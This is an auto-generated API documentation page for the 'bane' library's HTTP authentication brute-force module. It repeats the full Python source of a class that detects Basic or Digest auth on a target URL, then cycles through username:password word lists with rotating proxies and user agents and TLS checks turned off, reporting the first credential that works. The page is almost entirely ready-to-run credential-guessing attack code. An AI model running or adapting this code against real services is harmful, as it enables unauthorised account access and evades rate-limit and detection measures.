<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
<meta name="generator" content="pdoc 0.10.0" />
<title>bane.bruteforce.http_auth API documentation</title>
<meta name="description" content="" />
<link rel="preload stylesheet" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/sanitize.min.css" integrity="sha256-PK9q560IAAa6WVRRh76LtCaI8pjTJ2z11v0miyNNjrs=" crossorigin>
<link rel="preload stylesheet" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/typography.min.css" integrity="sha256-7l/o7C8jubJiy74VsKTidCy1yBkRtiUGbVkYBylBqUg=" crossorigin>
<link rel="stylesheet preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/github.min.css" crossorigin>
<style>:root{--highlight-color:#fe9}.flex{display:flex !important}body{line-height:1.5em}#content{padding:20px}#sidebar{padding:30px;overflow:hidden}#sidebar > *:last-child{margin-bottom:2cm}.http-server-breadcrumbs{font-size:130%;margin:0 0 15px 0}#footer{font-size:.75em;padding:5px 30px;border-top:1px solid #ddd;text-align:right}#footer p{margin:0 0 0 1em;display:inline-block}#footer p:last-child{margin-right:30px}h1,h2,h3,h4,h5{font-weight:300}h1{font-size:2.5em;line-height:1.1em}h2{font-size:1.75em;margin:1em 0 .50em 0}h3{font-size:1.4em;margin:25px 0 10px 0}h4{margin:0;font-size:105%}h1:target,h2:target,h3:target,h4:target,h5:target,h6:target{background:var(--highlight-color);padding:.2em 0}a{color:#058;text-decoration:none;transition:color .3s ease-in-out}a:hover{color:#e82}.title code{font-weight:bold}h2[id^="header-"]{margin-top:2em}.ident{color:#900}pre code{background:#f8f8f8;font-size:.8em;line-height:1.4em}code{background:#f2f2f1;padding:1px 4px;overflow-wrap:break-word}h1 code{background:transparent}pre{background:#f8f8f8;border:0;border-top:1px solid #ccc;border-bottom:1px solid #ccc;margin:1em 0;padding:1ex}#http-server-module-list{display:flex;flex-flow:column}#http-server-module-list div{display:flex}#http-server-module-list dt{min-width:10%}#http-server-module-list p{margin-top:0}.toc ul,#index{list-style-type:none;margin:0;padding:0}#index code{background:transparent}#index h3{border-bottom:1px solid #ddd}#index ul{padding:0}#index h4{margin-top:.6em;font-weight:bold}@media (min-width:200ex){#index .two-column{column-count:2}}@media (min-width:300ex){#index .two-column{column-count:3}}dl{margin-bottom:2em}dl dl:last-child{margin-bottom:4em}dd{margin:0 0 1em 3em}#header-classes + dl > dd{margin-bottom:3em}dd dd{margin-left:2em}dd p{margin:10px 0}.name{background:#eee;font-weight:bold;font-size:.85em;padding:5px 10px;display:inline-block;min-width:40%}.name:hover{background:#e0e0e0}dt:target .name{background:var(--highlight-color)}.name > span:first-child{white-space:nowrap}.name.class > span:nth-child(2){margin-left:.4em}.inherited{color:#999;border-left:5px solid #eee;padding-left:1em}.inheritance em{font-style:normal;font-weight:bold}.desc h2{font-weight:400;font-size:1.25em}.desc h3{font-size:1em}.desc dt code{background:inherit}.source summary,.git-link-div{color:#666;text-align:right;font-weight:400;font-size:.8em;text-transform:uppercase}.source summary > *{white-space:nowrap;cursor:pointer}.git-link{color:inherit;margin-left:1em}.source pre{max-height:500px;overflow:auto;margin:0}.source pre code{font-size:12px;overflow:visible}.hlist{list-style:none}.hlist li{display:inline}.hlist li:after{content:',\2002'}.hlist li:last-child:after{content:none}.hlist .hlist{display:inline;padding-left:1em}img{max-width:100%}td{padding:0 .5em}.admonition{padding:.1em .5em;margin-bottom:1em}.admonition-title{font-weight:bold}.admonition.note,.admonition.info,.admonition.important{background:#aef}.admonition.todo,.admonition.versionadded,.admonition.tip,.admonition.hint{background:#dfd}.admonition.warning,.admonition.versionchanged,.admonition.deprecated{background:#fd4}.admonition.error,.admonition.danger,.admonition.caution{background:lightpink}</style>
<style media="screen and (min-width: 700px)">@media screen and (min-width:700px){#sidebar{width:30%;height:100vh;overflow:auto;position:sticky;top:0}#content{width:70%;max-width:100ch;padding:3em 4em;border-left:1px solid #ddd}pre code{font-size:1em}.item .name{font-size:1em}main{display:flex;flex-direction:row-reverse;justify-content:flex-end}.toc ul ul,#index ul{padding-left:1.5em}.toc > ul > li{margin-top:.5em}}</style>
<style media="print">@media print{#sidebar h1{page-break-before:always}.source{display:none}}@media print{*{background:transparent !important;color:#000 !important;box-shadow:none !important;text-shadow:none !important}a[href]:after{content:" (" attr(href) ")";font-size:90%}a[href][title]:after{content:none}abbr[title]:after{content:" (" attr(title) ")"}.ir a:after,a[href^="javascript:"]:after,a[href^="#"]:after{content:""}pre,blockquote{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}tr,img{page-break-inside:avoid}img{max-width:100% !important}@page{margin:0.5cm}p,h2,h3{orphans:3;widows:3}h1,h2,h3,h4,h5,h6{page-break-after:avoid}}</style>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js" integrity="sha256-Uv3H6lx7dJmRfRvH8TH6kJD1TSK1aFcwgx+mdg3epi8=" crossorigin></script>
<script>window.addEventListener('DOMContentLoaded', () => hljs.initHighlighting())</script>
</head>
<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>bane.bruteforce.http_auth</code></h1>
</header>
<section id="section-intro">
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">from bane.bruteforce.utils import *

class http_auth_bruteforce:
    __slots__ = [&#34;logs&#34;, &#34;stop&#34;, &#34;finish&#34;, &#34;result&#34;]

    def __init__(
        self,
        u,
        word_list=[],
        threads_daemon=True,
        logs=True,
        domain=None,
        proxy=None,
        proxies=None,
        cookie=None,
        user_agent=None,
        timeout=10,
        headers={}
    ):
        self.stop = False
        self.logs = logs
        self.finish = False
        self.result = {}
        t = threading.Thread(
            target=self.crack,
            args=(
                u,
                domain,
                word_list,
                logs,
                proxy,
                proxies,
                cookie,
                user_agent,
                timeout,
                headers,
            ),
        )
        t.daemon = threads_daemon
        t.start()

    def done(self):
        return self.finish

    def crack(
        self, u, domain, word_list, logs, proxy, proxies, cookie, user_agent, timeout,headers
    ):
        if user_agent:
            us = user_agent
        else:
            us = random.choice(ua)
        hed = {&#34;User-Agent&#34;: us}
        if cookie:
            hed.update({&#34;Cookie&#34;: cookie})
        hed.update(headers)
        prox = None
        if proxy:
            prox = proxy#{&#34;http&#34;: &#34;http://&#34; + proxy, &#34;https&#34;: &#34;http://&#34; + proxy}
        if proxies:
            prox = random.choice(proxies)
            #prox = {&#34;http&#34;: &#34;http://&#34; + prox, &#34;https&#34;: &#34;http://&#34; + prox}
        try:
            if self.logs == True:
                print(&#34;[*]Checking Authentication Type:&#34;)
            resp = requests.Session().get(
                u, proxies=prox, headers=hed, verify=False, timeout=timeout
            )
            if &#34;basic&#34; in resp.headers[&#34;WWW-Authenticate&#34;].lower():
                if self.logs == True:
                    print(&#34;==&gt;Basic&#34;)
                auth_type = requests.auth.HTTPBasicAuth
            elif &#34;digest&#34; in resp.headers[&#34;WWW-Authenticate&#34;].lower():
                if self.logs == True:
                    print(&#34;==&gt;Digest&#34;)
                auth_type = requests.auth.HTTPDigestAuth
                &#34;&#34;&#34;elif &#39;ntlm&#39; in resp.headers[&#39;WWW-Authenticate&#39;].lower():
    if self.logs==True:
     print(&#34;==&gt;Ntlm&#34;)
    auth_type = requests_ntlm.HttpNtlmAuth
    if not domain:
     raise Exception(&#39;You need to specify a domain for &#34;Ntlm&#34; authentication !\n\nbane.http_auth_bruteforce(&#34;http://example.com&#34;,domain=&#34;example.com&#34;,.....)&#39;)&#34;&#34;&#34;
            else:
                if self.logs == True:
                    print(&#34;==&gt;Unknown type&#34;)
                self.finish = True
                return
        except:
            if self.logs == True:
                print(&#34;bane doesn&#39;t support this type of authentication&#34;)
            self.finish = True
            return
        for x in word_list:
            try:
                if self.stop == True:
                    self.finish = True
                    break
                username = x.split(&#34;:&#34;)[0]
                &#34;&#34;&#34;if domain and auth_type==requests_ntlm.HttpNtlmAuth:
     username=domain+&#39;\\&#39;+username&#34;&#34;&#34;
                password = x.split(&#34;:&#34;)[1]
                if self.logs == True:
                    print(&#34;[*]Trying: {} {}&#34;.format(username, password))
                prox = None
                if proxies:
                    prox = random.choice(proxies)
                if user_agent:
                    us = user_agent
                else:
                    us = random.choice(ua)
                hed = {&#34;User-Agent&#34;: us}
                if cookie:
                    hed.update({&#34;Cookie&#34;: cookie})
                r = requests.Session().get(
                    u,
                    auth=auth_type(username, password),
                    proxies=prox,
                    headers=hed,
                    verify=False,
                    timeout=timeout,
                )
                if (
                    (r.status_code == 200)
                    and (&#34;required&#34; not in r.text.lower())
                    and (&#34;wrong&#34; not in r.text.lower())
                    and (&#34;invalid&#34; not in r.text.lower())
                    and (&#34;denied&#34; not in r.text.lower())
                    and (&#34;unauthorized&#34; not in r.text.lower())
                ):
                    if self.logs == True:
                        print(&#34;[+]Success&#34;)
                    self.result = {u: username + &#34;:&#34; + password}
                    self.finish = True
                    break
                else:
                    if self.logs == True:
                        print(&#34;[-]Fail&#34;)
            except Exception as ex:
                if self.logs == True:
                    print(&#34;[-]Fail&#34;)
        self.finish = True</code></pre>
</details>
</section>
<section>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-classes">Classes</h2>
<dl>
<dt id="bane.bruteforce.http_auth.http_auth_bruteforce"><code class="flex name class">
<span>class <span class="ident">http_auth_bruteforce</span></span>
<span>(</span><span>u, word_list=[], threads_daemon=True, logs=True, domain=None, proxy=None, proxies=None, cookie=None, user_agent=None, timeout=10, headers={})</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class http_auth_bruteforce:
    __slots__ = [&#34;logs&#34;, &#34;stop&#34;, &#34;finish&#34;, &#34;result&#34;]

    def __init__(
        self,
        u,
        word_list=[],
        threads_daemon=True,
        logs=True,
        domain=None,
        proxy=None,
        proxies=None,
        cookie=None,
        user_agent=None,
        timeout=10,
        headers={}
    ):
        self.stop = False
        self.logs = logs
        self.finish = False
        self.result = {}
        t = threading.Thread(
            target=self.crack,
            args=(
                u,
                domain,
                word_list,
                logs,
                proxy,
                proxies,
                cookie,
                user_agent,
                timeout,
                headers,
            ),
        )
        t.daemon = threads_daemon
        t.start()

    def done(self):
        return self.finish

    def crack(
        self, u, domain, word_list, logs, proxy, proxies, cookie, user_agent, timeout,headers
    ):
        if user_agent:
            us = user_agent
        else:
            us = random.choice(ua)
        hed = {&#34;User-Agent&#34;: us}
        if cookie:
            hed.update({&#34;Cookie&#34;: cookie})
        hed.update(headers)
        prox = None
        if proxy:
            prox = proxy#{&#34;http&#34;: &#34;http://&#34; + proxy, &#34;https&#34;: &#34;http://&#34; + proxy}
        if proxies:
            prox = random.choice(proxies)
            #prox = {&#34;http&#34;: &#34;http://&#34; + prox, &#34;https&#34;: &#34;http://&#34; + prox}
        try:
            if self.logs == True:
                print(&#34;[*]Checking Authentication Type:&#34;)
            resp = requests.Session().get(
                u, proxies=prox, headers=hed, verify=False, timeout=timeout
            )
            if &#34;basic&#34; in resp.headers[&#34;WWW-Authenticate&#34;].lower():
                if self.logs == True:
                    print(&#34;==&gt;Basic&#34;)
                auth_type = requests.auth.HTTPBasicAuth
            elif &#34;digest&#34; in resp.headers[&#34;WWW-Authenticate&#34;].lower():
                if self.logs == True:
                    print(&#34;==&gt;Digest&#34;)
                auth_type = requests.auth.HTTPDigestAuth
                &#34;&#34;&#34;elif &#39;ntlm&#39; in resp.headers[&#39;WWW-Authenticate&#39;].lower():
    if self.logs==True:
     print(&#34;==&gt;Ntlm&#34;)
    auth_type = requests_ntlm.HttpNtlmAuth
    if not domain:
     raise Exception(&#39;You need to specify a domain for &#34;Ntlm&#34; authentication !\n\nbane.http_auth_bruteforce(&#34;http://example.com&#34;,domain=&#34;example.com&#34;,.....)&#39;)&#34;&#34;&#34;
            else:
                if self.logs == True:
                    print(&#34;==&gt;Unknown type&#34;)
                self.finish = True
                return
        except:
            if self.logs == True:
                print(&#34;bane doesn&#39;t support this type of authentication&#34;)
            self.finish = True
            return
        for x in word_list:
            try:
                if self.stop == True:
                    self.finish = True
                    break
                username = x.split(&#34;:&#34;)[0]
                &#34;&#34;&#34;if domain and auth_type==requests_ntlm.HttpNtlmAuth:
     username=domain+&#39;\\&#39;+username&#34;&#34;&#34;
                password = x.split(&#34;:&#34;)[1]
                if self.logs == True:
                    print(&#34;[*]Trying: {} {}&#34;.format(username, password))
                prox = None
                if proxies:
                    prox = random.choice(proxies)
                if user_agent:
                    us = user_agent
                else:
                    us = random.choice(ua)
                hed = {&#34;User-Agent&#34;: us}
                if cookie:
                    hed.update({&#34;Cookie&#34;: cookie})
                r = requests.Session().get(
                    u,
                    auth=auth_type(username, password),
                    proxies=prox,
                    headers=hed,
                    verify=False,
                    timeout=timeout,
                )
                if (
                    (r.status_code == 200)
                    and (&#34;required&#34; not in r.text.lower())
                    and (&#34;wrong&#34; not in r.text.lower())
                    and (&#34;invalid&#34; not in r.text.lower())
                    and (&#34;denied&#34; not in r.text.lower())
                    and (&#34;unauthorized&#34; not in r.text.lower())
                ):
                    if self.logs == True:
                        print(&#34;[+]Success&#34;)
                    self.result = {u: username + &#34;:&#34; + password}
                    self.finish = True
                    break
                else:
                    if self.logs == True:
                        print(&#34;[-]Fail&#34;)
            except Exception as ex:
                if self.logs == True:
                    print(&#34;[-]Fail&#34;)
        self.finish = True</code></pre>
</details>
<h3>Instance variables</h3>
<dl>
<dt id="bane.bruteforce.http_auth.http_auth_bruteforce.finish"><code class="name">var <span class="ident">finish</span></code></dt>
<dd>
<div class="desc"><p>Return an attribute of instance, which is of type owner.</p></div>
</dd>
<dt id="bane.bruteforce.http_auth.http_auth_bruteforce.logs"><code class="name">var <span class="ident">logs</span></code></dt>
<dd>
<div class="desc"><p>Return an attribute of instance, which is of type owner.</p></div>
</dd>
<dt id="bane.bruteforce.http_auth.http_auth_bruteforce.result"><code class="name">var <span class="ident">result</span></code></dt>
<dd>
<div class="desc"><p>Return an attribute of instance, which is of type owner.</p></div>
</dd>
<dt id="bane.bruteforce.http_auth.http_auth_bruteforce.stop"><code class="name">var <span class="ident">stop</span></code></dt>
<dd>
<div class="desc"><p>Return an attribute of instance, which is of type owner.</p></div>
</dd>
</dl>
<h3>Methods</h3>
<dl>
<dt id="bane.bruteforce.http_auth.http_auth_bruteforce.crack"><code class="name flex">
<span>def <span class="ident">crack</span></span>(<span>self, u, domain, word_list, logs, proxy, proxies, cookie, user_agent, timeout, headers)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def crack(
    self, u, domain, word_list, logs, proxy, proxies, cookie, user_agent, timeout,headers
):
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    hed.update(headers)
    prox = None
    if proxy:
        prox = proxy#{&#34;http&#34;: &#34;http://&#34; + proxy, &#34;https&#34;: &#34;http://&#34; + proxy}
    if proxies:
        prox = random.choice(proxies)
        #prox = {&#34;http&#34;: &#34;http://&#34; + prox, &#34;https&#34;: &#34;http://&#34; + prox}
    try:
        if self.logs == True:
            print(&#34;[*]Checking Authentication Type:&#34;)
        resp = requests.Session().get(
            u, proxies=prox, headers=hed, verify=False, timeout=timeout
        )
        if &#34;basic&#34; in resp.headers[&#34;WWW-Authenticate&#34;].lower():
            if self.logs == True:
                print(&#34;==&gt;Basic&#34;)
            auth_type = requests.auth.HTTPBasicAuth
        elif &#34;digest&#34; in resp.headers[&#34;WWW-Authenticate&#34;].lower():
            if self.logs == True:
                print(&#34;==&gt;Digest&#34;)
            auth_type = requests.auth.HTTPDigestAuth
            &#34;&#34;&#34;elif &#39;ntlm&#39; in resp.headers[&#39;WWW-Authenticate&#39;].lower():
if self.logs==True:
 print(&#34;==&gt;Ntlm&#34;)
auth_type = requests_ntlm.HttpNtlmAuth
if not domain:
 raise Exception(&#39;You need to specify a domain for &#34;Ntlm&#34; authentication !\n\nbane.http_auth_bruteforce(&#34;http://example.com&#34;,domain=&#34;example.com&#34;,.....)&#39;)&#34;&#34;&#34;
        else:
            if self.logs == True:
                print(&#34;==&gt;Unknown type&#34;)
            self.finish = True
            return
    except:
        if self.logs == True:
            print(&#34;bane doesn&#39;t support this type of authentication&#34;)
        self.finish = True
        return
    for x in word_list:
        try:
            if self.stop == True:
                self.finish = True
                break
            username = x.split(&#34;:&#34;)[0]
            &#34;&#34;&#34;if domain and auth_type==requests_ntlm.HttpNtlmAuth:
 username=domain+&#39;\\&#39;+username&#34;&#34;&#34;
            password = x.split(&#34;:&#34;)[1]
            if self.logs == True:
                print(&#34;[*]Trying: {} {}&#34;.format(username, password))
            prox = None
            if proxies:
                prox = random.choice(proxies)
            if user_agent:
                us = user_agent
            else:
                us = random.choice(ua)
            hed = {&#34;User-Agent&#34;: us}
            if cookie:
                hed.update({&#34;Cookie&#34;: cookie})
            r = requests.Session().get(
                u,
                auth=auth_type(username, password),
                proxies=prox,
                headers=hed,
                verify=False,
                timeout=timeout,
            )
            if (
                (r.status_code == 200)
                and (&#34;required&#34; not in r.text.lower())
                and (&#34;wrong&#34; not in r.text.lower())
                and (&#34;invalid&#34; not in r.text.lower())
                and (&#34;denied&#34; not in r.text.lower())
                and (&#34;unauthorized&#34; not in r.text.lower())
            ):
                if self.logs == True:
                    print(&#34;[+]Success&#34;)
                self.result = {u: username + &#34;:&#34; + password}
                self.finish = True
                break
            else:
                if self.logs == True:
                    print(&#34;[-]Fail&#34;)
        except Exception as ex:
            if self.logs == True:
                print(&#34;[-]Fail&#34;)
    self.finish = True</code></pre>
</details>
</dd>
<dt id="bane.bruteforce.http_auth.http_auth_bruteforce.done"><code class="name flex">
<span>def <span class="ident">done</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def done(self):
    return self.finish</code></pre>
</details>
</dd>
</dl>
</dd>
</dl>
</section>
</article>
<nav id="sidebar">
<h1>Index</h1>
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a title="bane.bruteforce" href="index.md">bane.bruteforce</a></code></li>
</ul>
</li>
<li><h3><a href="#header-classes">Classes</a></h3>
<ul>
<li>
<h4><code><a title="bane.bruteforce.http_auth.http_auth_bruteforce" href="#bane.bruteforce.http_auth.http_auth_bruteforce">http_auth_bruteforce</a></code></h4>
<ul class="two-column">
<li><code><a title="bane.bruteforce.http_auth.http_auth_bruteforce.crack" href="#bane.bruteforce.http_auth.http_auth_bruteforce.crack">crack</a></code></li>
<li><code><a title="bane.bruteforce.http_auth.http_auth_bruteforce.done" href="#bane.bruteforce.http_auth.http_auth_bruteforce.done">done</a></code></li>
<li><code><a title="bane.bruteforce.http_auth.http_auth_bruteforce.finish" href="#bane.bruteforce.http_auth.http_auth_bruteforce.finish">finish</a></code></li>
<li><code><a title="bane.bruteforce.http_auth.http_auth_bruteforce.logs" href="#bane.bruteforce.http_auth.http_auth_bruteforce.logs">logs</a></code></li>
<li><code><a title="bane.bruteforce.http_auth.http_auth_bruteforce.result" href="#bane.bruteforce.http_auth.http_auth_bruteforce.result">result</a></code></li>
<li><code><a title="bane.bruteforce.http_auth.http_auth_bruteforce.stop" href="#bane.bruteforce.http_auth.http_auth_bruteforce.stop">stop</a></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
</footer>
</body>
</html>